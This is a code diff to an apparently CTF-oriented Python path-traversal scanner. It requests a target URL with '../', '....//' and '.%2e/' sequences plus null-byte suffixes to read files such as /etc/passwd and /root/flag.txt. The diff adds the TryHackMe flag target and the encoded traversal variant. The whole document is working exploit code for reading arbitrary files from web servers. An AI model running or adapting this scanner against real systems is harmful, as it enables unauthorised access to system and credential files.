@@ -8,6 +8,9 @@ import argparse
 import requests
 
 common_files=[ {
+        "name": "/root/flag.txt",
+        "checks": ["THM{"],
+    },{
         "name": "/etc/passwd",
         "checks": ["root:x","/bin/bash"],
     },{
@@ -39,7 +42,7 @@ parser.add_argument('-f', '--file', dest="search_file", required=False, type=str
 
 args = parser.parse_args()
 url = args.url
-dts=['../', '....//']
+dts=['../', '....//',".%2e/"]
 nbyte = ['','/.','%00']
 max_depth=12
 
@@ -68,9 +71,11 @@ def dir_trav(url, f):
                     r = requests.get(dtr_url)
                 else:
                     dtr_url = url + (sym * i) +  f['name'][1:] + nb
+                    #print("[-] TRYING: " + dtr_url, end='\r')
                     print("[-] TRYING: " + dtr_url)
                     r = requests.get(dtr_url)
                     print(r.status_code)
+                    #print(r.text)
                 for check in f['checks']:
                     if check in r.text:
                         return [ url, sym, i, nb]
